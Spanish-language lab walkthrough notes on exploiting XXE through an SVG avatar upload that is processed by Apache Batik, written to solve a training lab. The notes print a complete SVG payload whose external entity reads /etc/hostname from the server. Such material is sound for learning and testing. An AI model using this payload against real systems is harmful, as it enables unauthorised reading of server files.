En esta clase seguimos explorando vectores de ataque XXE, esta vez aprovechando la funcionalidad de subida de imágenes del laboratorio. El servidor permite a los usuarios subir avatares en formato SVG, los cuales son procesados con la librería Apache Batik. Esta librería interpreta entidades definidas dentro del SVG, lo que abre la puerta a un ataque XXE clásico.

Creamos un archivo SVG en el que definimos una entidad que apunta al archivo del sistema que contiene el nombre del host. Luego, insertamos esa entidad como contenido textual del SVG. Al subir la imagen como avatar en un comentario, el servidor procesa el archivo y renderiza el contenido de esa entidad, mostrando así el nombre del host en el propio avatar. Esta información es la que se necesita para resolver el laboratorio.

Solucion
primero podemos usar la biblia
![Pasted image 20250730205158.png](imagenes/Pasted image 20250730205158.png)
https://github.com/swisskyrepo/PayloadsAllTheThings

entonces aqui lo que se hace es por medio de un archivo que dentro contendra un payload nos mostrar la data 
payload (<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]>
<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
   <text font-size="16" x="0" y="16">&xxe;</text>
</svg>)
Nuestra supuesta imagen se llamara image.svg y contendra el payload
![Pasted image 20250730210003.png](imagenes/Pasted image 20250730210003.png)
y lo cargaremos en la web
![Pasted image 20250730210143.png](imagenes/Pasted image 20250730210143.png)
aqui podemos ver nuestro comentario
![Pasted image 20250730210223.png](imagenes/Pasted image 20250730210223.png)
aqui poco se ve la imagen pero lo abrimos en una nueva pestaña
![Pasted image 20250730210259.png](imagenes/Pasted image 20250730210259.png)
y obtenemos dentro de la imagen el hostname
